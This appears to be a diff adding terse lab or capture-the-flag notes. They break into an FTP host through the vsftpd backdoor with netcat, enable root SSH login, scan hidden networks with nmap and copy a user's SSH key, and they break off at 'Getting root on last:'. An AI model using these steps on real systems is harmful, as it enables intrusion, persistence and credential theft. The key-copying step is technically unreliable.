@@ -1,0 +1,39 @@
+Get ssh acces on ftp machine:
+ open a termialn te host machine and execute this command :
+	netcat 192.168.2.1 21
+* type "USER x:)" and then "PASS <anything>"
+* open another terminal on the host machine and execute this command :
+	netcat 192.168.2.1 6200 -p <port_1_to_1023>
+* you are now root on a remote shell on the ftp machine, type any sh command
+From now:
+1) Set up root password:
+passwd root
+(e.g root)
+2)Allow root ssh login:
+echo PermitRootLogin yes >>/etc/ssh/sshd_config
+3)Restart service
+/etc/init.d/ssh restart
+
+On another shell:
+ssh root@ip_ftp 
+
+Network discovery:
+1) Top-level view:
+	ip a => only one network : 192.168.2.1/24
+	(apt install nmap):already here
+	nmap -sV 192.168.2.1/24 (get informartions on service as well)
+	Firewall at 192.168.2.2, a quick guess is there is at least one hidden network 
+	behind the firewall (what about: 192.168.3.1 ?Or 192.168.1.1)
+2)Further)
+	nmap 192.168.3.1 -Pn -sN -Sv => host is up & ssh (not vulnerable:openssh v8)
+	(-sN/-sF/-sX to escape firewall)
+
+Ssh connexion:
+1)Password is not know... maybe there is a certificate connexion for an user ?
+2) seek other users : ls /home: ftp garfield john martine ouioui
+.ssh folders: ouioui have one ssh key !
+Goind to steal him...
+cp /home/ouioui/.ssh/publickey ~/.ssh/
+3) ssh ouioui@192.168.3.1
+
+Getting root on last:
